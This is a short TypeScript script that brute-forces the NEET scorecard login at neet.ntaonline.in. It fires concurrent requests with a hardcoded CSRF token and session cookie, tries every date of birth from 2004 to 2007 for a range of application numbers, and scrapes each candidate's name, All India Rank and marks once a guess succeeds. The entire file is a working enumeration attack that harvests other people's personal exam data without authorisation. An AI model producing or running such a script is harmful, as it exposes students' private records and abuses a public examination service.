import axios from "axios";
import cheerio from 'cheerio'
import qs from 'qs'
async function solve(applicationNumber:string,day:string,month:string,year:string){
    let data = qs.stringify({
        '_csrf-frontend': 'JUlPhrkMYPOEA82k8aqoKtdEnmi1WXgDHX6YD_eE8K0XEz_z7H4riv4uh8WWn8Bzji7VB-0yTWZWRsxWxMaB5g==',
        'Scorecardmodel[ApplicationNumber]': applicationNumber,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year 
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: { 
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 
          'Accept-Language': 'en-US,en;q=0.5', 
          'Accept-Encoding': 'gzip, deflate, br', 
          'Content-Type': 'application/x-www-form-urlencoded', 
          'Origin': 'null', 
          'Connection': 'keep-alive', 
          'Cookie': 'advanced-frontend=1ea526lpf51u4qcsbi5ne7pl2j; _csrf-frontend=4dbd2caa48d25ad6931ef78c8d8ad573fc93241164da9bce967a131250e957cba%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%222ZpuUrKyz-Jag5hYYjKoXk5eK8TY3BqK%22%3B%7D', 
          'Upgrade-Insecure-Requests': '1', 
          'Sec-Fetch-Dest': 'document', 
          'Sec-Fetch-Mode': 'navigate', 
          'Sec-Fetch-Site': 'same-origin', 
          'Sec-Fetch-User': '?1'
        },
        data : data
      };
      try{
        const res=await axios.request(config)
        const parsedData= parseHTML(JSON.stringify(res.data));
        return parsedData;
      }
      catch(e){
        return null;
      }
   
   
      
}

function parseHTML(htmlContent:string){
    const $ =cheerio.load(htmlContent)

    const applicationNumber= $('td:contains("Application No.")').next('td').text().trim() || 'N/A';
    const candidateName= $('td:contains("Candidate’s Name")').next().text().trim() || 'N/A';
    const allIndiaRank= $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';

    const marks= $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';
   

    if(allIndiaRank ==='N/A'){
        return null
    }
    return{
        applicationNumber,
        candidateName,
        allIndiaRank,
        marks
    }



}

async function main(roll:string) {
    let solved=false;
    for(let year=2007;year>=2004;year--){
        if(solved){
            break;
        }
        for(let month=1;month<=12;month++){
            if(solved){
                break;
            }
            const dataPromises=[];
            console.log(`roll no of ${roll} request for month ` + month + "of year "+ year)
            for(let day=1;day<=31;day++){
                const dataPromise= solve(roll,day.toString(),month.toString(),year.toString())
                dataPromises.push(dataPromise);
                }
               const resData= await Promise.all(dataPromises)
               resData.forEach(data=>{
                if(data){
                    console.log(data);
                    solved=true;
                }
               })
            }
        }
    }


    async function solveAll() {
        for(let i=240411345673;i<=240411345693;i++){
            await main(i.toString());

        }

        

    }

    solveAll();
